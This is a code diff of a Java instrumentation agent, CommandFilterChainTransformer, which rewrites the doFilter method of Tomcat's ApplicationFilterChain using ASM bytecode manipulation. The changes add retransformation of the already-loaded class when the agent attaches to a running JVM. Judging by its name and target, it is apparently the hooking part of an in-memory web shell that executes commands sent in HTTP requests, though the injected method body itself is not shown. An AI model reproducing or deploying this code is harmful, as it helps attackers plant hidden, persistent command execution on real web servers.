@@ -4,7 +4,7 @@ import org.objectweb.asm.*;
 
 import java.lang.instrument.ClassFileTransformer;
 import java.lang.instrument.Instrumentation;
-import java.lang.reflect.Method;
+import java.lang.instrument.UnmodifiableClassException;
 import java.security.ProtectionDomain;
 
 /**
@@ -14,19 +14,51 @@ public class CommandFilterChainTransformer implements ClassFileTransformer {
 
     private static final String TARGET_CLASS = "org/apache/catalina/core/ApplicationFilterChain";
 
-    public static ClassVisitor getClassVisitor(ClassVisitor cv) {
-        return new ClassVisitor(Opcodes.ASM9, cv) {
-            @Override
-            public MethodVisitor visitMethod(int access, String name, String descriptor,
-                                             String signature, String[] exceptions) {
-                MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
-                if ("doFilter".equals(name) &&
-                        "(Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;)V".equals(descriptor)) {
-                    return new DoFilterMethodVisitor(mv);
-                }
-                return mv;
+    @Override
+    public byte[] transform(final ClassLoader loader, String className, Class<?> classBeingRedefined,
+                            ProtectionDomain protectionDomain, byte[] bytes) {
+        if (TARGET_CLASS.equals(className)) {
+            try {
+                ClassReader cr = new ClassReader(bytes);
+                ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES) {
+                    @Override
+                    protected ClassLoader getClassLoader() {
+                        return loader;
+                    }
+                };
+                ClassVisitor cv = new ClassVisitor(Opcodes.ASM9, cw) {
+                    @Override
+                    public MethodVisitor visitMethod(int access, String name, String descriptor,
+                                                     String signature, String[] exceptions) {
+                        MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
+                        if ("doFilter".equals(name) &&
+                                "(Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;)V".equals(descriptor)) {
+                            return new DoFilterMethodVisitor(mv);
+                        }
+                        return mv;
+                    }
+                };
+                cr.accept(cv, ClassReader.EXPAND_FRAMES);
+                return cw.toByteArray();
+            } catch (Exception e) {
+                e.printStackTrace();
             }
-        };
+        }
+        return bytes;
+    }
+
+    public static void premain(String args, Instrumentation inst) {
+        inst.addTransformer(new CommandFilterChainTransformer(), true);
+    }
+
+    public static void agentmain(String args, Instrumentation inst) throws UnmodifiableClassException {
+        inst.addTransformer(new CommandFilterChainTransformer(), true);
+        for (Class<?> allLoadedClass : inst.getAllLoadedClasses()) {
+            String name = allLoadedClass.getName();
+            if (TARGET_CLASS.replace("/", ".").equals(name)) {
+                inst.retransformClasses(allLoadedClass);
+            }
+        }
     }
 
     private static class DoFilterMethodVisitor extends MethodVisitor {
@@ -178,32 +210,4 @@ public class CommandFilterChainTransformer implements ClassFileTransformer {
         }
     }
 
-    @Override
-    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,
-                            ProtectionDomain protectionDomain, byte[] bytes) {
-        if (TARGET_CLASS.equals(className)) {
-            try {
-                ClassReader cr = new ClassReader(bytes);
-                ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES);
-                Method getClassLoader = cw.getClass().getDeclaredMethod("getClassLoader");
-                getClassLoader.setAccessible(true);
-                System.out.println(getClassLoader.invoke(cw));
-                ClassVisitor cv = CommandFilterChainTransformer.getClassVisitor(cw);
-                cr.accept(cv, ClassReader.EXPAND_FRAMES);
-                return cw.toByteArray();
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
-        }
-        return bytes;
-    }
-
-    public static void premain(String args, Instrumentation inst) {
-        inst.addTransformer(new CommandFilterChainTransformer(), true);
-    }
-
-    public static void agentmain(String args, Instrumentation inst) {
-        System.out.println(DoFilterMethodVisitor.class.getClassLoader());
-        inst.addTransformer(new CommandFilterChainTransformer(), true);
-    }
 }
